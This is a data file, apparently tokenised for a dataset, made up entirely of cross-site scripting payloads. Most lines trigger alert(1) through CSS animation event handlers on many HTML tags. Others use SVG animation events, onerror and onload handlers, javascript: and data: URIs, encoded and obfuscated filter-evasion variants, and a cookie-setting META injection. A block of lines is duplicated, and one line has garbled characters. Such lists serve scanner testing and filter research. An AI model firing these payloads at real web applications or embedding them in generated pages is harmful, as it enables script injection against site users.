+< style > @ keyframes SPACE slidein SPACE { } < /style > < abbr SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /abbr >
+< style > @ keyframes SPACE x { } < /style > < table SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /table >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < image SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /image >
+< style > @ keyframes SPACE x { } < /style > < dfn SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /dfn >
+< style > @ keyframes SPACE x { } < /style > < form SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /form >
+< style > @ keyframes SPACE x { } < /style > < br SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /br >
+< style > @ keyframes SPACE x { } < /style > < picture SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /picture >
+< body SPACE onresize= " alert ( 1 ) " >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < summary SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /summary >
+< svg > < image SPACE href=1 SPACE onerror=alert ( 1 ) >
+< style > @ keyframes SPACE x { } < /style > < blockquote SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /blockquote >
+< style > @ keyframes SPACE x { } < /style > < details SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /details >
+< style > @ keyframes SPACE x { } < /style > < map SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /map >
+< style > @ keyframes SPACE x { } < /style > < ol SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /ol >
+< style > @ keyframes SPACE x { } < /style > < optgroup SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /optgroup >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < nobr SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /nobr >
+< style > @ keyframes SPACE x { } < /style > < wbr SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /wbr >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < small SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /small >
+< style > @ keyframes SPACE x { } < /style > < iframe SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /iframe >
+< style > @ keyframes SPACE x { } < /style > < summary SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /summary >
+< style > @ keyframes SPACE x { } < /style > < strike SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /strike >
+< style > @ keyframes SPACE x { } < /style > < nav SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /nav >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < address SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /address >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < kbd SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /kbd >
+< style > @ keyframes SPACE x { } < /style > < sub SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /sub >
+< style > @ keyframes SPACE x { } < /style > < kbd SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /kbd >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < i SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /i >
+< style > @ keyframes SPACE x { } < /style > < code SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /code >
+< style > @ keyframes SPACE x { } < /style > < u SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /u >
+< style > @ keyframes SPACE x { } < /style > < center SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /center >
+< style > @ keyframes SPACE x { } < /style > < command SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /command >
+< style > @ keyframes SPACE x { } < /style > < iframe SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /iframe >
+< style > @ keyframes SPACE x { } < /style > < nextid SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /nextid >
+< style > @ keyframes SPACE x { } < /style > < object SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /object >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < select SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /select >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < slot SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /slot >
+< style > @ keyframes SPACE x { } < /style > < big SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /big >
+< style > @ keyframes SPACE x { } < /style > < s SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /s >
+< style > @ keyframes SPACE x { } < /style > < dir SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /dir >
+< svg > < set SPACE onend=alert ( 1 ) SPACE attributename=x SPACE dur=1s >
+< iframe SPACE src= " data : text/html , % 3C % 73 % 63 % 72 % 69 % 70 % 74 % 3E % 61 % 6C % 65 % 72 % 74 % 28 % 31 % 29 % 3C % 2F % 73 % 63 % 72 % 69 % 70 % 74 % 3E " > < /iframe >
+< style > @ keyframes SPACE x { } < /style > < mark SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /mark >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < del SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /del >
+< style > @ keyframes SPACE x { } < /style > < figcaption SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /figcaption >
+< style > @ keyframes SPACE x { } < /style > < section SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /section >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < img SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /img >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < menu SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /menu >
+< style > @ keyframes SPACE x { } < /style > < listing SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /listing >
+< style > @ keyframes SPACE x { } < /style > < xmp SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /xmp >
+< style SPACE onload=alert ( 1 ) > < /style >
+< style > @ keyframes SPACE x { } < /style > < bdo SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /bdo >
+< svg > < set SPACE onbegin=alert ( 1 ) SPACE attributename=x SPACE dur=1s >
+< style > @ keyframes SPACE x { } < /style > < plaintext SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /plaintext >
+< SCRIPT > alert ( `` ) < /SCRIPT >
+< style > @ keyframes SPACE x { } < /style > < textarea SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /textarea >
+< style > @ keyframes SPACE x { } < /style > < ins SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /ins >
+< style > @ keyframes SPACE x { } < /style > < sup SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /sup >
+< style > @ keyframes SPACE x { } < /style > < tt SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /tt >
+< style > @ keyframes SPACE x { } < /style > < ul SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /ul >
+< style > @ keyframes SPACE x { } < /style > < details SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /details >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < figcaption SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /figcaption >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < label SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /label >
+< style > @ keyframes SPACE x { } < /style > < hr SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /hr >
+< style > @ keyframes SPACE x { } < /style > < listing SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /listing >
+< style > @ keyframes SPACE x { } < /style > < img SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /img >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < samp SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /samp >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < p SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /p >
+< style > @ keyframes SPACE x { } < /style > < wbr SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /wbr >
+< style > @ keyframes SPACE x { } < /style > < map SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /map >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < source SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /source >
+< svg > < animate SPACE onbegin=alert ( 1 ) SPACE attributeName=x SPACE dur=1s >
+< IMG SPACE SRC=/ SPACE onerror= " alert ( String.fromCharCode ( 88,83,83 ) ) " > < /img >
+< body SPACE onresize= " alert ( 1 ) " >
+< style > @ keyframes SPACE x { } < /style > < html SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /html >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < em SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /em >
+< style > @ keyframes SPACE x { } < /style > < li SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /li >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < pre SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /pre >
+< /script > < script > alert ( `` ) ; < /script >
+< style > @ keyframes SPACE x { } < /style > < source SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /source >
+< style > @ keyframes SPACE x { } < /style > < blink SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /blink >
+< link SPACE rel=stylesheet SPACE href=1 SPACE onerror=alert ( 1 ) >
+< style > @ keyframes SPACE x { } < /style > < div SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /div >
+< svg > < animatetransform SPACE onend=alert ( 1 ) SPACE attributeName=transform SPACE dur=1s >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < br SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /br >
+< style > @ keyframes SPACE x { } < /style > < bgsound SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /bgsound >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < input SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /input >
+< style > @ keyframes SPACE x { } < /style > < del SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /del >
+< style > @ keyframes SPACE x { } < /style > < address SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /address >
+< body SPACE onload=alert ( 1 ) >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < bgsound SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /bgsound >
+< style > @ keyframes SPACE x { } < /style > < image SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /image >
+< style > @ keyframes SPACE x { } < /style > < dt SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /dt >
+META SPACE HTTP-EQUIV= " Set-Cookie " SPACE Content= " USERID= < SCRIPT > alert ( `` ) < /SCRIPT > " >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < sup SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /sup >
+< style > @ keyframes SPACE x { } < /style > < cite SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /cite >
+< style > @ keyframes SPACE x { } < /style > < dfn SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /dfn >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < body SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /body >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < aside SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /aside >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < object SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /object >
+< style > @ keyframes SPACE x { } < /style > < a SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /a >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < blink SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /blink >
+< style > @ keyframes SPACE x { } < /style > < font SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /font >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < var SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /var >
+< style > @ keyframes SPACE x { } < /style > < sup SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /sup >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < xmp SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /xmp >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < nextid SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /nextid >
+< style > @ keyframes SPACE x { } < /style > < keygen SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /keygen >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < progress SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /progress >
+< style > @ keyframes SPACE x { } < /style > < menuitem SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /menuitem >
+< style > @ keyframes SPACE x { } < /style > < cite SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /cite >
+< style > @ keyframes SPACE x { } < /style > < section SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /section >
+< svg > < animate SPACE onend=alert ( 1 ) SPACE attributeName=x SPACE dur=1s >
+< style > @ keyframes SPACE x { } < /style > < u SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /u >
+< < SCRIPT > alert ( `` " ) ; //\ < < /SCRIPT >
+< svg SPACE onload=alert ( 1 ) >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < div SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /div >
+< details SPACE ontoggle=alert ( 1 ) SPACE open > test < /details >
+< style > @ keyframes SPACE x { } < /style > < aside SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /aside >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < map SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /map >
+< style > @ keyframes SPACE x { } < /style > < acronym SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /acronym >
+< /TITLE > < SCRIPT > alert ( `` " ) ; < /SCRIPT >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < keygen SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /keygen >
+< style > @ keyframes SPACE x { } < /style > < button SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /button >
+< style > @ keyframes SPACE x { } < /style > < figcaption SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /figcaption >
+< style > @ keyframes SPACE x { } < /style > < footer SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /footer >
+< image SPACE src/onerror=alert ( 1 ) >
+< style > @ keyframes SPACE x { } < /style > < dd SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /dd >
+< style > @ keyframes SPACE x { } < /style > < fieldset SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /fieldset >
+< style > @ keyframes SPACE x { } < /style > < element SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /element >
+< style > @ keyframes SPACE x { } < /style > < q SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /q >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < marquee SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /marquee >
+< style > @ keyframes SPACE x { } < /style > < option SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /option >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < mark SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /mark >
+< style > @ keyframes SPACE x { } < /style > < hr SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /hr >
+< img SPACE src= " / " SPACE =_= " SPACE title= " onerror='prompt ( 1 ) ' " >
+< style > @ keyframes SPACE x { } < /style > < option SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /option >
+< style > @ keyframes SPACE x { } < /style > < bgsound SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /bgsound >
+< style > @ keyframes SPACE x { } < /style > < video SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /video >
+< video > < track SPACE default SPACE onload=alert ( 1 ) SPACE src= " data : text/vtt , WEBVTT " > < /video >
+< body SPACE onpageshow=alert ( 1 ) >
+< style > @ keyframes SPACE x { } < /style > < image SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /image >
+< style > @ keyframes SPACE x { } < /style > < rtc SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /rtc >
+< style > @ keyframes SPACE x { } < /style > < q SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /q >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < picture SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /picture >
+< style > @ keyframes SPACE x { } < /style > < aside SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /aside >
+< style > @ keyframes SPACE x { } < /style > < data SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /data >
+< style > @ keyframes SPACE x { } < /style > < object SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /object >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < legend SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /legend >
+< style > @ keyframes SPACE x { } < /style > < menu SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /menu >
+< style > @ keyframes SPACE x { } < /style > < content SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /content >
+< style > @ keyframes SPACE x { } < /style > < output SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /output >
+< style > @ keyframes SPACE x { } < /style > < article SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /article >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < svg SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /svg >
+< style > @ keyframes SPACE x { } < /style > < acronym SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /acronym >
+< style > @ keyframes SPACE x { } < /style > < rt SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /rt >
+< style > @ keyframes SPACE x { } < /style > < marquee SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /marquee >
+< style > @ keyframes SPACE x { } < /style > < progress SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /progress >
+< style > @ keyframes SPACE x { } < /style > < kbd SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /kbd >
+< style > @ keyframes SPACE x { } < /style > < abbr SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /abbr >
+< audio SPACE src/onerror=alert ( 1 ) >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < acronym SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /acronym >
+< style > @ keyframes SPACE x { } < /style > < div SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /div >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < isindex SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /isindex >
+< style > @ keyframes SPACE x { } < /style > < blockquote SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /blockquote >
+< style > @ keyframes SPACE x { } < /style > < legend SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /legend >
+< style > @ keyframes SPACE x { } < /style > < article SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /article >
+< embed SPACE src=/ SPACE onload=alert ( 1 ) >
+< style > @ keyframes SPACE x { } < /style > < marquee SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /marquee >
+< style > @ keyframes SPACE x { } < /style > < applet SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /applet >
+< img SPACE SPACE src= " x : gif " SPACE onerror= " window [ 'al\u0065rt ' ] ( 0 ) " > < /img >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < article SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /article >
+< style > @ keyframes SPACE x { } < /style > < xmp SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /xmp >
+`` > < iframe SPACE src= " javascript : alert ( ) " >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < li SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /li >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < section SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /section >
+< style > @ keyframes SPACE x { } < /style > < rb SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /rb >
+< style > @ keyframes SPACE x { } < /style > < small SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /small >
+< style > @ keyframes SPACE x { } < /style > < menu SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /menu >
+< style > @ keyframes SPACE x { } < /style > < output SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /output >
+< style > @ keyframes SPACE x { } < /style > < canvas SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /canvas >
+< style > @ keyframes SPACE x { } < /style > < img SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /img >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < data SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /data >
+< style > @ keyframes SPACE x { } < /style > < p SPACE style= " animation-name : x " SPACE onanimationend= " alert ( 1 ) " > < /p >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < menuitem SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /menuitem >
+< svg > < path > < animateMotion SPACE onbegin=alert ( 1 ) SPACE dur= " 1s " SPACE repeatCount= " 1 " >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < output SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /output >
+< style > @ keyframes SPACE x { } < /style > < center SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /center >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < hgroup SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /hgroup >
+< style > @ keyframes SPACE x { } < /style > < ol SPACE style= " animation-name : x " SPACE onanimationstart= " alert ( 1 ) " > < /ol >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < tt SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /tt >
+`` > < /SCRIPT > 窶・窶・ < SCRIPT > alert ( String.fromCharCode ( 88,83,83 ) ) < /SCRIPT >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < details SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /details >
+< style > @ keyframes SPACE slidein SPACE { } < /style > < optgroup SPACE style= " animation-duration:1s ; animation-name : slidein ; animation-iteration-count:2 " SPACE onanimationiteration= " alert ( 1 ) " > < /optgroup >
+' ; alert ( String.fromCharCode ( 88,83,83 ) ) // ' ; alert ( String.fromCharCode ( 88,83,83 ) ) // " ; alert ( String.fromCharCode ( 88,83,83 ) ) // " ; alert ( String.fromCharCode ( 88,83,83 ) ) // -- > < /SCRIPT > " > ' > < SCRIPT > alert ( String.fromCharCode ( 88,83,83 ) ) < /SCRIPT >
+< IMG SPACE `` " " > < SCRIPT > alert ( `` XSS " ) < /SCRIPT > " >
+< IMG SPACE SRC=/ SPACE onerror= " alert ( String.fromCharCode ( 88,83,83 ) ) " > < /img >
+< < SCRIPT > alert ( `` XSS " ) ; // < < /SCRIPT >
+< /script > < script > alert ( 'XSS ' ) ; < /script >
+< /TITLE > < SCRIPT > alert ( `` XSS " ) ; < /SCRIPT >
+< BODY SPACE ONLOAD=alert ( 'XSS ' ) >
+< IFRAME SPACE SRC= " javascript : alert ( 'XSS ' ) ; " > < /IFRAME >
+veris -- > group < svg/onload=alert ( /XSS/ ) //
+element [ attribute= ' < img SPACE src=x SPACE onerror=alert ( 'XSS ' ) ; >
+< svg/onload= % 26 % 23097lert % 26lpar ; 1337 ) >
+' ; alert ( String.fromCharCode ( 88,83,83 ) ) // ' ; alert ( String.fromCharCode ( 88,83,83 ) ) // " ; alert ( String.fromCharCode ( 88,83,83 ) ) // " ; alert ( String.fromCharCode ( 88,83,83 ) ) // -- > < /SCRIPT > " > ' > < SCRIPT > alert ( String.fromCharCode ( 88,83,83 ) ) < /SCRIPT >
+< IMG SPACE `` " " > < SCRIPT > alert ( `` XSS " ) < /SCRIPT > " >
+< IMG SPACE SRC=/ SPACE onerror= " alert ( String.fromCharCode ( 88,83,83 ) ) " > < /img >
+< < SCRIPT > alert ( `` XSS " ) ; // < < /SCRIPT >
+< /script > < script > alert ( 'XSS ' ) ; < /script >
+< /TITLE > < SCRIPT > alert ( `` XSS " ) ; < /SCRIPT >
+< BODY SPACE ONLOAD=alert ( 'XSS ' ) >
+< IFRAME SPACE SRC= " javascript : alert ( 'XSS ' ) ; " > < /IFRAME >
+veris -- > group < svg/onload=alert ( /XSS/ ) //
+element [ attribute= ' < img SPACE src=x SPACE onerror=alert ( 'XSS ' ) ; >
+< svg/onload= % 26 % 23097lert % 26lpar ; 1337 ) >
+' % 3E % 3Cstyle % 3E % 3Cimg % 20src= % 22 % 3C/style % 3E % 3Cimg % 20src=x % 20onerror=javascript : alert ( 1 ) // % 22 % 3E
